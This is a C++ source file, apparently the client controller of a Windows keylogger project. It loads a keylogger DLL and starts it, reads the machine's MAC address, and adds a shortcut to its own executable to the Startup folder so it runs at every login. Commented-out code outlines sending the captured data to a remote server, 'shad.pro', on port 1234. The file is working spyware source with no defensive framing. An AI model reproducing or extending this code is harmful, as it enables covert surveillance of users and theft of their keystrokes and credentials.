#include <iostream>
#include "client.h"
#include "sayHello.h"
#include "IInfoClient.h"


/////////////////////////////////////////////////////////////////
//  SETTINGS
/////////////////////////////////////////////////////////////////

clientController::clientController(void) throw(DLibraryException)
{

	//////////////////////////////
	// Load libraries
	//////////////////////////////

	#ifdef __linux__
		this->libraries.add(1, "sayHello", "./libsayHello.so");
	#elif _WIN32
		this->libraries.add(1, "sayHello", "sayHello.dll");
		this->libraries.add(2, "infoClient", "InfoClient.dll");
		this->libraries.add(2, "keylogger_dll", "keylogger_dll.dll");
	#endif

	if (!(this->libraries.handler.loadByName("sayHello")))
		throw DLibraryException("sayHello", "Couldn't load module.");
	if (!(this->sayHello = this->libraries.handler.getDictionaryByName("sayHello")))
		throw DLibraryException("sayHello", "Couldn't get Dictionary.");
	#ifdef _WIN32
	if (!(this->libraries.handler.loadByName("infoClient")))
		throw DLibraryException("infoClient", "Couldn't load module.");
	if (!(this->infoClient = this->libraries.handler.getDictionaryByName("infoClient")))
		throw DLibraryException("infoClient", "Couldn't get ClassInstance");
	this->ifinstance = ((_getInstance)(*this->infoClient)["getInstance"])();

	if (!(this->libraries.handler.loadByName("keylogger_dll")))
		throw DLibraryException("keylogger_dll", "Couldn't load module.");
	if (!(this->keylogger_dll = this->libraries.handler.getDictionaryByName("keylogger_dll")))
		throw DLibraryException("keylogger_dll", "Couldn't get Dictionary.");
	this->klinstance = ((_instantiate)(*this->keylogger_dll)["instantiate"])(std::ref(this->_lwqueue));
	#endif
}

clientController::~clientController(void)
{
	this->libraries.handler.closeList();
}

/////////////////////////////////////////////////////////////////
//  SCENARIO
/////////////////////////////////////////////////////////////////

int		clientController::mainAction(int ac, char **av) {

	// Dire bonjour
	this->sayHelloAction();
	this->defineShortcut();
	this->klinstance->init();
	std::cout << this->ifinstance->getMacAddr() << std::endl;
	// Faire pleins de trucs :
	// this->dhinstance->init();

	// _lqueue = this->dhinstance->getLocaleQueue();
	// this->netinstance->init("shad.pro", 1234);
	// this->netinstance->auth(ifinstance->routine());
	// this->dhinstance->setNetQueue(this->netinstance->getQueue());
	//std::thread keylogging(klinstance->run());
	//std::thread datahandling(dhinstance->routine());
	//std::thread networking(netinstance->routine(_lqueue));
	// keylog.join();
	// datahandling.join();
	// networking.join();
	
	// keylogger_test

	return (0);
}

void					clientController::sayHelloAction(void) {

	((_sayHelloFrom)(*this->sayHello)["sayHelloFrom"])("client");
}


void	clientController::defineShortcut(void) {
	LPCSTR module = new char[MAX_PATH];
	if (GetModuleFileName(NULL, (LPSTR)module, MAX_PATH) != 0) {
		PWSTR pszpath;
		if (SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &pszpath) == S_OK) {
			std::wstring shortcut_path(pszpath);
			shortcut_path += SHORTCUT_NAME;
			CoTaskMemFree(pszpath);
			if (PathFileExistsW((LPWSTR)shortcut_path.c_str()) == false)
				createShortcut(module, shortcut_path.c_str(), DESCR);
			return;
		}
	}
}

bool clientController::createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr) {
	HRESULT hres;
	IShellLink* psl;

	CoInitializeEx(NULL, COINIT_MULTITHREADED);
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
	if (SUCCEEDED(hres)) {
		IPersistFile* ppf;
		psl->SetPath(lpszPathObj);
		psl->SetDescription(descr);

		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
		if (SUCCEEDED(hres)) {
			hres = ppf->Save(lpszPathLink, TRUE);
			ppf->Release();
		}
		psl->Release();
	}
	return SUCCEEDED(hres);
}
